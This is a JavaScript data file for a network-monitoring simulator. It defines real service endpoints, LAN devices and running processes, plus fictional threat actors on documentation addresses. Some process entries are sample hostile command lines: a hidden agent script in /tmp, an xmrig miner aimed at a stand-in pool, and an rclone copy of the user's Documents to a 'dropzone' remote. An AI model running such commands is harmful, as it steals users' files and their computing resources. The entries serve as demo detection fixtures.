// Demo world: plausible endpoints and processes for the simulator.
//
// Benign services use addresses from their operators' public ranges, placed
// where IP geolocation databases typically put them. Every malicious actor
// uses RFC 5737 documentation addresses (192.0.2.0/24, 198.51.100.0/24,
// 203.0.113.0/24), private-use ASNs (64512–65534) and the reserved
// `.example` TLD, so nothing here points at a real party.

const city = (name, region, cc, country, lat, lon) => ({ city: name, region, cc, country, lat, lon });

export const CITIES = {
  mtv: city('Mountain View', 'California', 'US', 'United States', 37.4056, -122.0775),
  sf: city('San Francisco', 'California', 'US', 'United States', 37.7749, -122.4194),
  sj: city('San Jose', 'California', 'US', 'United States', 37.3382, -121.8863),
  cupertino: city('Cupertino', 'California', 'US', 'United States', 37.323, -122.0322),
  losgatos: city('Los Gatos', 'California', 'US', 'United States', 37.2358, -121.9624),
  seattle: city('Seattle', 'Washington', 'US', 'United States', 47.6062, -122.3321),
  redmond: city('Redmond', 'Washington', 'US', 'United States', 47.674, -122.1215),
  ashburn: city('Ashburn', 'Virginia', 'US', 'United States', 39.0438, -77.4874),
  kc: city('Kansas City', 'Missouri', 'US', 'United States', 39.0997, -94.5786),
  toronto: city('Toronto', 'Ontario', 'CA', 'Canada', 43.6532, -79.3832),
  saopaulo: city('São Paulo', 'São Paulo', 'BR', 'Brazil', -23.5505, -46.6333),
  dublin: city('Dublin', 'Leinster', 'IE', 'Ireland', 53.3498, -6.2603),
  london: city('London', 'England', 'GB', 'United Kingdom', 51.5072, -0.1276),
  amsterdam: city('Amsterdam', 'North Holland', 'NL', 'Netherlands', 52.3676, 4.9041),
  paris: city('Paris', 'Île-de-France', 'FR', 'France', 48.8566, 2.3522),
  frankfurt: city('Frankfurt am Main', 'Hesse', 'DE', 'Germany', 50.1109, 8.6821),
  falkenstein: city('Falkenstein', 'Saxony', 'DE', 'Germany', 50.4779, 12.3713),
  stockholm: city('Stockholm', 'Stockholm', 'SE', 'Sweden', 59.3293, 18.0686),
  lulea: city('Luleå', 'Norrbotten', 'SE', 'Sweden', 65.5848, 22.1547),
  odense: city('Odense', 'Southern Denmark', 'DK', 'Denmark', 55.4038, 10.4024),
  helsinki: city('Helsinki', 'Uusimaa', 'FI', 'Finland', 60.1699, 24.9384),
  reykjavik: city('Reykjavík', 'Capital Region', 'IS', 'Iceland', 64.1466, -21.9426),
  johannesburg: city('Johannesburg', 'Gauteng', 'ZA', 'South Africa', -26.2041, 28.0473),
  mumbai: city('Mumbai', 'Maharashtra', 'IN', 'India', 19.076, 72.8777),
  singapore: city('Singapore', 'Singapore', 'SG', 'Singapore', 1.3521, 103.8198),
  tokyo: city('Tokyo', 'Tokyo', 'JP', 'Japan', 35.6762, 139.6503),
  seoul: city('Seoul', 'Seoul', 'KR', 'South Korea', 37.5665, 126.978),
  sydney: city('Sydney', 'New South Wales', 'AU', 'Australia', -33.8688, 151.2093),
};

const AS = {
  google: [15169, 'Google LLC'],
  cloudflare: [13335, 'Cloudflare, Inc.'],
  fastly: [54113, 'Fastly, Inc.'],
  akamai: [16625, 'Akamai Technologies, Inc.'],
  amazon: [14618, 'Amazon.com, Inc.'],
  microsoft: [8075, 'Microsoft Corporation'],
  apple: [714, 'Apple Inc.'],
  github: [36459, 'GitHub, Inc.'],
  discord: [49544, 'Discord, Inc.'],
  spotify: [8403, 'Spotify AB'],
  valve: [32590, 'Valve Corporation'],
  netflix: [2906, 'Netflix Streaming Services Inc.'],
  anthropic: [399358, 'Anthropic, PBC'],
  meta: [32934, 'Meta Platforms, Inc.'],
  telegram: [62041, 'Telegram Messenger Inc'],
  twitter: [13414, 'Twitter Inc.'],
  wikimedia: [14907, 'Wikimedia Foundation Inc.'],
  hetzner: [24940, 'Hetzner Online GmbH'],
  zoom: [30103, 'Zoom Video Communications, Inc.'],
  twitch: [46489, 'Twitch Interactive Inc.'],
  jio: [55836, 'Reliance Jio Infocomm Limited'],
  naver: [23576, 'NAVER Cloud Corp.'],
  globo: [28604, 'Globo Comunicacao e Participacoes SA'],
  // Fictional actors (private-use ASNs).
  shadow: [64512, 'Shadownet Hosting (demo)'],
  northwind: [64513, 'Northwind VPS (demo)'],
  coldvault: [64514, 'Coldvault Storage (demo)'],
  minepool: [64515, 'Hashfall Pool (demo)'],
  relay: [64516, 'Volunteer Tor relay (demo)'],
  legacy: [64517, 'Legacy Systems Ltd (demo)'],
};

const ep = (key, ip, name, cityKey, asKey, extra = {}) => ({
  key, ip, name, ...CITIES[cityKey], asn: AS[asKey][0], org: AS[asKey][1], scope: 'public', ...extra,
});

/**
 * Endpoints. `app` and `port` are the typical way the demo talks to them;
 * `cname` lists a CNAME chain for DNS events; `ech` marks Encrypted Client
 * Hello (outer SNI becomes the provider's public name).
 */
export const ENDPOINTS = [
  ep('google', '142.250.185.68', 'www.google.com', 'mtv', 'google', { svc: 'google', app: 'quic', port: 443, alpn: 'h3' }),
  ep('youtube', '142.250.74.238', 'www.youtube.com', 'mtv', 'google', { svc: 'youtube', app: 'quic', port: 443, alpn: 'h3', cname: ['youtube-ui.l.google.com'] }),
  ep('googlevideo', '173.194.182.105', 'rr4---sn-4g5edn6r.googlevideo.com', 'dublin', 'google', { svc: 'youtube', app: 'quic', port: 443, alpn: 'h3' }),
  ep('gstatic', '142.250.181.227', 'fonts.gstatic.com', 'mtv', 'google', { svc: 'google', app: 'quic', port: 443, alpn: 'h3' }),
  ep('cloudflare', '104.16.123.96', 'www.cloudflare.com', 'sf', 'cloudflare', { svc: 'cloudflare', app: 'tls', port: 443, ech: true }),
  ep('doh', '1.1.1.1', 'one.one.one.one', 'sf', 'cloudflare', { svc: 'cloudflare', app: 'doh', port: 443, tags: ['doh'] }),
  ep('resolver', '1.0.0.1', 'one.one.one.one', 'sf', 'cloudflare', { svc: 'cloudflare', app: 'dns', port: 53, proto: 'udp' }),
  ep('github', '140.82.113.4', 'github.com', 'ashburn', 'github', { svc: 'github', app: 'tls', port: 443 }),
  ep('github-api', '140.82.113.6', 'api.github.com', 'ashburn', 'github', { svc: 'github', app: 'tls', port: 443 }),
  ep('github-ssh', '140.82.113.3', 'github.com', 'ashburn', 'github', { svc: 'github', app: 'ssh', port: 22 }),
  ep('ghuc', '185.199.108.133', 'objects.githubusercontent.com', 'sf', 'fastly', { svc: 'fastly', app: 'tls', port: 443 }),
  ep('discord', '162.159.135.232', 'gateway.discord.gg', 'sf', 'cloudflare', { svc: 'discord', app: 'tls', port: 443 }),
  ep('discord-voice', '66.22.196.20', 'rotterdam1234.discord.media', 'amsterdam', 'discord', { svc: 'discord', app: 'stun', port: 50003, proto: 'udp' }),
  ep('spotify', '35.186.224.25', 'spclient.wg.spotify.com', 'stockholm', 'spotify', { svc: 'spotify', app: 'tls', port: 443 }),
  ep('spotify-audio', '23.32.29.89', 'audio-ak-spotify-com.akamaized.net', 'paris', 'akamai', { svc: 'spotify', app: 'tls', port: 443 }),
  ep('steam-api', '23.33.124.37', 'api.steampowered.com', 'seattle', 'akamai', { svc: 'steam', app: 'tls', port: 443 }),
  ep('steam-cdn1', '162.254.195.71', 'cache8-sea1.steamcontent.com', 'seattle', 'valve', { svc: 'steam', app: 'http', port: 80 }),
  ep('steam-cdn2', '162.254.195.72', 'cache9-sea1.steamcontent.com', 'seattle', 'valve', { svc: 'steam', app: 'http', port: 80 }),
  ep('steam-cdn3', '23.40.62.11', 'steampipe.akamaized.net', 'london', 'akamai', { svc: 'steam', app: 'http', port: 80 }),
  ep('netflix', '45.57.90.1', 'occ-0-1001-999.1.nflxso.net', 'losgatos', 'netflix', { svc: 'netflix', app: 'tls', port: 443 }),
  ep('anthropic', '160.79.104.10', 'api.anthropic.com', 'sf', 'anthropic', { svc: 'anthropic', app: 'tls', port: 443 }),
  ep('openai', '162.159.140.245', 'api.openai.com', 'sf', 'cloudflare', { svc: 'openai', app: 'tls', port: 443 }),
  ep('microsoft', '20.190.160.20', 'login.microsoftonline.com', 'redmond', 'microsoft', { svc: 'microsoft', app: 'tls', port: 443 }),
  ep('apple', '17.253.53.208', 'gs.apple.com', 'cupertino', 'apple', { svc: 'apple', app: 'tls', port: 443 }),
  ep('telegram', '149.154.167.51', 'web.telegram.org', 'amsterdam', 'telegram', { svc: 'telegram', app: 'tls', port: 443 }),
  ep('reddit', '151.101.1.140', 'www.reddit.com', 'sf', 'fastly', { svc: 'reddit', app: 'quic', port: 443, alpn: 'h3' }),
  ep('x', '104.244.42.66', 'api.x.com', 'sf', 'twitter', { svc: 'x', app: 'tls', port: 443 }),
  ep('wikipedia', '185.15.59.224', 'en.wikipedia.org', 'amsterdam', 'wikimedia', { app: 'tls', port: 443 }),
  ep('telemetry', '34.120.208.123', 'incoming.telemetry.mozilla.org', 'kc', 'google', { svc: 'gcp', app: 'tls', port: 443 }),
  ep('ntp', '162.159.200.123', 'time.cloudflare.com', 'sf', 'cloudflare', { svc: 'cloudflare', app: 'ntp', port: 123, proto: 'udp' }),
  ep('mirror', '168.119.143.12', 'mirror.cachyos.org', 'falkenstein', 'hetzner', { app: 'tls', port: 443 }),
  ep('docker', '54.227.20.253', 'registry-1.docker.io', 'ashburn', 'amazon', { svc: 'aws', app: 'tls', port: 443 }),
  ep('bastion', '95.216.12.40', 'bastion.example.net', 'helsinki', 'hetzner', { app: 'ssh', port: 22 }),
  ep('zoom', '170.114.52.2', 'zoom.us', 'sj', 'zoom', { svc: 'zoom', app: 'tls', port: 443 }),
  ep('whatsapp', '157.240.27.54', 'g.whatsapp.net', 'lulea', 'meta', { svc: 'whatsapp', app: 'tls', port: 443 }),
  ep('instagram', '157.240.20.63', 'scontent.cdninstagram.com', 'odense', 'meta', { svc: 'meta', app: 'quic', port: 443, alpn: 'h3' }),
  ep('twitch', '52.223.195.9', 'usher.ttvnw.net', 'sf', 'twitch', { svc: 'twitch', app: 'tls', port: 443 }),
  ep('jio', '49.44.79.236', 'www.jio.com', 'mumbai', 'jio', { svc: 'jio', app: 'tls', port: 443 }),
  ep('nhk', '23.62.226.70', 'www3.nhk.or.jp', 'tokyo', 'akamai', { svc: 'akamai', app: 'quic', port: 443, alpn: 'h3' }),
  ep('abc', '23.67.253.105', 'www.abc.net.au', 'sydney', 'akamai', { svc: 'akamai', app: 'quic', port: 443, alpn: 'h3' }),
  ep('globo', '186.192.83.12', 'www.globo.com', 'saopaulo', 'globo', { app: 'tls', port: 443 }),
  ep('news24', '104.18.24.79', 'www.news24.com', 'johannesburg', 'cloudflare', { svc: 'cloudflare', app: 'tls', port: 443 }),
  ep('straits', '23.200.143.164', 'www.straitstimes.com', 'singapore', 'akamai', { svc: 'akamai', app: 'quic', port: 443, alpn: 'h3' }),
  ep('cbc', '23.212.249.75', 'www.cbc.ca', 'toronto', 'akamai', { svc: 'akamai', app: 'tls', port: 443 }),
  ep('naver', '223.130.200.104', 'www.naver.com', 'seoul', 'naver', { app: 'quic', port: 443, alpn: 'h3' }),
  ep('bbc', '151.101.0.81', 'www.bbc.co.uk', 'london', 'fastly', { svc: 'fastly', app: 'quic', port: 443, alpn: 'h3' }),
  // ── fictional threat actors ──
  ep('c2', '203.0.113.66', 'update-cdn.example', 'saopaulo', 'shadow', { app: 'tls', port: 443, tags: ['c2'] }),
  ep('beacon', '198.51.100.23', null, 'toronto', 'northwind', { app: 'tls', port: 8443 }),
  ep('exfil', '203.0.113.140', 'files.dropzone.example', 'sydney', 'coldvault', { app: 'tls', port: 443 }),
  ep('pool', '198.51.100.77', 'pool.hashfall.example', 'singapore', 'minepool', { app: 'unknown', port: 3333 }),
  ep('tor1', '198.51.100.9', null, 'reykjavik', 'relay', { app: 'tls', port: 9001, svc: 'tor', tags: ['tor'] }),
  ep('tor2', '198.51.100.10', null, 'stockholm', 'relay', { app: 'tls', port: 9001, svc: 'tor', tags: ['tor'] }),
  ep('irc', '203.0.113.200', 'irc.oldnet.example', 'frankfurt', 'legacy', { app: 'unknown', port: 6667 }),
  ep('legacytls', '198.51.100.42', 'legacy-api.example', 'london', 'legacy', { app: 'tls', port: 443 }),
];

/** Local network. */
export const LAN = [
  { key: 'router', ip: '192.168.1.1', name: 'router.lan', scope: 'lan', app: 'http', port: 80 },
  { key: 'tv', ip: '192.168.1.20', name: 'LG-webOS-TV.local', scope: 'lan', app: 'ssdp', port: 1900, proto: 'udp' },
  { key: 'nas', ip: '192.168.1.42', name: 'nas.local', scope: 'lan', app: 'unknown', port: 445 },
  { key: 'iot', ip: '192.168.1.66', name: null, scope: 'lan', app: 'unknown', port: 0 },
  { key: 'mdns', ip: '224.0.0.251', name: 'mdns.mcast.net', scope: 'multicast', app: 'mdns', port: 5353, proto: 'udp' },
  { key: 'ssdp', ip: '239.255.255.250', name: null, scope: 'multicast', app: 'ssdp', port: 1900, proto: 'udp' },
];

export const PROCS = {
  firefox: { pid: 4242, name: 'firefox', exe: '/usr/lib/firefox/firefox', cmd: '/usr/lib/firefox/firefox', user: 'demo', unit: 'app-hyprland-firefox-4242.scope' },
  discord: { pid: 5101, name: 'Discord', exe: '/opt/discord/Discord', cmd: '/opt/discord/Discord --enable-features=UseOzonePlatform', user: 'demo', unit: 'app-hyprland-discord-5101.scope' },
  spotify: { pid: 5310, name: 'spotify', exe: '/opt/spotify/spotify', cmd: '/opt/spotify/spotify', user: 'demo', unit: 'app-hyprland-spotify-5310.scope' },
  steam: { pid: 6001, name: 'steam', exe: '/home/demo/.local/share/Steam/ubuntu12_32/steam', cmd: 'steam -silent', user: 'demo', unit: 'app-hyprland-steam-6001.scope' },
  code: { pid: 7002, name: 'code', exe: '/opt/visual-studio-code/code', cmd: '/opt/visual-studio-code/code --type=utility', user: 'demo', unit: 'app-hyprland-code-7002.scope' },
  claude: { pid: 7310, name: 'claude', exe: '/usr/bin/node', cmd: 'node /usr/lib/node_modules/@anthropic-ai/claude-code/cli.js', user: 'demo', unit: 'app-hyprland-kitty-7300.scope' },
  ssh: { pid: 8123, name: 'ssh', exe: '/usr/bin/ssh', cmd: 'ssh bastion.example.net', user: 'demo', unit: 'app-hyprland-kitty-7300.scope' },
  git: { pid: 8811, name: 'ssh', exe: '/usr/bin/ssh', cmd: "ssh git@github.com git-receive-pack 'demo/telluric.git'", user: 'demo', unit: 'app-hyprland-kitty-7300.scope' },
  resolved: { pid: 612, name: 'systemd-resolved', exe: '/usr/lib/systemd/systemd-resolved', cmd: '/usr/lib/systemd/systemd-resolved', user: 'systemd-resolve', unit: 'systemd-resolved.service' },
  timesyncd: { pid: 611, name: 'systemd-timesyncd', exe: '/usr/lib/systemd/systemd-timesyncd', cmd: '/usr/lib/systemd/systemd-timesyncd', user: 'systemd-timesync', unit: 'systemd-timesyncd.service' },
  avahi: { pid: 700, name: 'avahi-daemon', exe: '/usr/bin/avahi-daemon', cmd: 'avahi-daemon: running [demo.local]', user: 'avahi', unit: 'avahi-daemon.service' },
  dockerd: { pid: 900, name: 'dockerd', exe: '/usr/bin/dockerd', cmd: '/usr/bin/dockerd -H fd://', user: 'root', unit: 'docker.service' },
  pacman: { pid: 9050, name: 'pacman', exe: '/usr/bin/pacman', cmd: 'pacman -Syu', user: 'root', unit: 'session-2.scope' },
  python: { pid: 9182, name: 'python3', exe: '/usr/bin/python3.14', cmd: 'python3 /tmp/.cache/.x/agent.py --quiet', user: 'demo', unit: 'session-2.scope' },
  xmrig: { pid: 13377, name: 'xmrig', exe: '/tmp/.cache/xmrig', cmd: '/tmp/.cache/xmrig --donate-level 0 -o pool.hashfall.example:3333', user: 'demo', unit: 'session-2.scope' },
  rclone: { pid: 14002, name: 'rclone', exe: '/usr/bin/rclone', cmd: 'rclone copy ~/Documents dropzone:backup', user: 'demo', unit: 'session-2.scope' },
  tor: { pid: 15010, name: 'tor', exe: '/usr/bin/tor', cmd: '/usr/bin/tor -f /etc/tor/torrc', user: 'tor', unit: 'tor.service' },
};

/** Plausible JA4 strings by client family (demo data, not a reference set). */
export const JA4 = {
  firefox: 't13d1717h2_5b57614c22b0_3cbfd9057e0d',
  firefoxQuic: 'q13d0313h3_55b375c5d22e_2a25e0e5d3a6',
  chromium: 't13d1516h2_8daaf6152771_02713d6af862',
  node: 't13d1012h2_1d37bd780c83_0fd2b5a7d4a5',
  python: 't13d311100_e8f1e7e78f70_d339722ba4af',
  go: 't13d1210h2_c866b44c5a26_b2a6a8b4d0d5',
  legacy: 't10d070600_c50f5591e341_1a3805c3aa63',
  steam: 't12d1210h1_d34a8e72043a_b39be8c56a14',
};

/** Sites the background browser visits, with weights. */
export const BROWSING = [
  ['google', 9], ['youtube', 5], ['gstatic', 6], ['cloudflare', 3], ['github', 5], ['ghuc', 3], ['reddit', 4],
  ['x', 2], ['wikipedia', 4], ['openai', 2], ['microsoft', 2], ['telegram', 1], ['instagram', 3], ['bbc', 3],
  ['nhk', 1], ['abc', 1], ['globo', 1], ['news24', 1], ['straits', 1], ['cbc', 1], ['naver', 1], ['jio', 1],
  ['twitch', 2], ['netflix', 2], ['zoom', 1], ['whatsapp', 1],
];
